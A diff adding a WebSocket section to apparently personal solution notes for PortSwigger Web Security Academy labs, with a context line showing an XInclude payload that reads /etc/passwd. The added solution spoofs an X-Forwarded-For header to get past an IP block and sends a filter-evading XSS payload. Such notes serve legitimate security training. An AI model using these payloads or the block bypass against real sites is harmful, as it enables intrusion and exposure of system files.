@@ -105,6 +105,28 @@ In the browser DevTools panel, go to the Elements tab and study the HTML content
   Xinclude in productId
   <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 
+ 
+  
+  
+## WebSocket 
+
+**Chapter:**
+  https://portswigger.net/web-security/websockets
+    
+**Lab:**
+https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities
+  
+**Limitations:** NA
+
+**Solution:** 
+  
+Intercept and try with XSS, if IP is blocked, reconnect and add following header:
+  
+X-Forwarded-For: 1.1.1.1
+
+Click connect and send the payload
+
+<img src=1 oNeRrOr=alert`1`>
   
   
 
@@ -121,4 +143,6 @@ In the browser DevTools panel, go to the Elements tab and study the HTML content
 **Limitations:** NA
 
 **Solution:** 
+
+
 
